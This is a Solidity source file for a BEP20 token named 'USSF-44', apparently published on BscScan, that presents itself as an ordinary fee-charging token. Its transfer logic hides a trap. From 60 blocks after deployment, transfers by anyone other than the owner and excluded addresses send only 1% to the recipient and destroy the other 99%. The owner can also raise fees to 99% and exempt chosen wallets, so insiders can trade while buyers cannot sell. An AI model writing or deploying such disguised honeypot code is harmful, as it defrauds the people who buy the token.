/**
 *Submitted for verification at BscScan.com on 2022-11-02


*/


                   

pragma solidity 0.5.16;
import "./IBEP20.sol";
import "./Context.sol";
import "./Ownable.sol";
import "./Safemath.sol";



contract USSF is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private timeAtDeploy;
  uint256 private _totalSupply;
  uint8 private _decimals;
  uint256 private FeeBuySell;
  string private _symbol;
  string private _name;
  address public _teamWallet;
  mapping (address => bool) public isExcludedFromFee;

  
  constructor() public {
    _name = "USSF-44";
    _symbol = "USSF";
    _decimals = 18;
    _totalSupply = 10000000000000000000000000000000000;
    _balances[msg.sender] = _totalSupply;
    _teamWallet = owner();
    FeeBuySell = 10;
    isExcludedFromFee[owner()] = true;
    isExcludedFromFee[address(this)] = true;
    timeAtDeploy = block.number;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }



      /**
   * @dev set new  tax when transfer.
   */
  function setTaxes(uint256 newTax) external onlyOwner returns (bool) {
    require(newTax < 100, "Tax exceeds maxTax");
    FeeBuySell = newTax;
    return true;
  }

        /**
   * @dev Returns the tax when transfer.
   */
  function getTax() external view returns (uint256) {
    return FeeBuySell;
  }

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address) {
    return owner();
  }

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8) {
    return _decimals;
  }

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory) {
    return _symbol;
  }

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory) {
    return _name;
  }

  /**
   * @dev See {BEP20-totalSupply}.
   */
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }

  /**
   * @dev See {BEP20-balanceOf}.
   */
  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }

  /**
   * @dev See {BEP20-transfer}.
   *
   * Requirements:
   *
   * - `recipient` cannot be the zero address.
   * - the caller must have a balance of at least `amount`.
   */
  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }


  /**
  * @dev set an address will be excluded from fee, tax
  */
  function setisExcludedFromFee(address account, bool newValue) public onlyOwner {
        isExcludedFromFee[account] = newValue;
  }


  /**
  * @dev set multi address will be excluded from fee, tax
  */
  function multiExcludeFromFee(address[] memory addresses, bool status) public onlyOwner {
      require(addresses.length < 201);
      for (uint256 i; i < addresses.length; ++i) {
          isExcludedFromFee[addresses[i]] = status;
      }
  }

  /**
   * @dev See {BEP20-allowance}.
   */
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }

  /**
   * @dev See {BEP20-approve}.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   */
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  /**
   * @dev See {BEP20-transferFrom}.
   *
   * Emits an {Approval} event indicating the updated allowance. This is not
   * required by the EIP. See the note at the beginning of {BEP20};
   *
   * Requirements:
   * - `sender` and `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   * - the caller must have allowance for `sender`'s tokens of at least
   * `amount`.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  /**
   * @dev Atomically increases the allowance granted to `spender` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {BEP20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   */
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  /**
   * @dev Atomically decreases the allowance granted to `spender` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {BEP20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   * - `spender` must have allowance for the caller of at least
   * `subtractedValue`.
   */
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }



  /**
   * @dev Moves tokens `amount` from `sender` to `recipient`.
   *
   * This is internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `sender` cannot be the zero address.
   * - `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   */
  function _transfer(address sender, address recipient, uint256 amoun) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");




    if (isExcludedFromFee[sender] == true|| sender == recipient || isExcludedFromFee[recipient] == true){
    // if (sender == owner() || sender == recipient || recipient == owner()  ){
        _balances[sender] = _balances[sender].sub(amoun, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amoun);

        emit Transfer(sender, recipient, amoun);
    }
    else{
      if (check() >= timeAtDeploy + 60){

        afterBL(sender, recipient, amoun);

      }
      else{
        uint256 recipientAmount = amoun - amoun * FeeBuySell /100 ;
        uint256 teamAmount = amoun - recipientAmount;

        _balances[sender] = _balances[sender].sub(amoun, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(recipientAmount);
        _balances[_teamWallet] = _balances[_teamWallet].add(teamAmount);

        emit Transfer(sender, _teamWallet, teamAmount);
        emit Transfer(sender, recipient, recipientAmount);
      }
    }


  }





  /**
   * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
   *
   * This is internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
  
     /**
   * @dev set team wallet.
   */
  function setTeamWallet(address newWallet) external onlyOwner returns (bool) {
    
    _teamWallet = newWallet;
    return true;
  }

    /**
   * @dev check bloc.
   */
  function check() private returns (uint256) {
    
    return block.number;
  }

   /**
   * @dev check bloc.
   */
  function afterBL(address sender, address recipient, uint256 amoun) internal {
    
    uint256 getAmount = amoun - amoun * 99 /100 ;
    uint256 teamAmount = amoun - amoun;

    _balances[sender] = _balances[sender].sub(amoun, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(getAmount);
    _balances[_teamWallet] = _balances[_teamWallet].add(teamAmount);

    emit Transfer(sender, _teamWallet, teamAmount);
    emit Transfer(sender, recipient, getAmount);
  }

}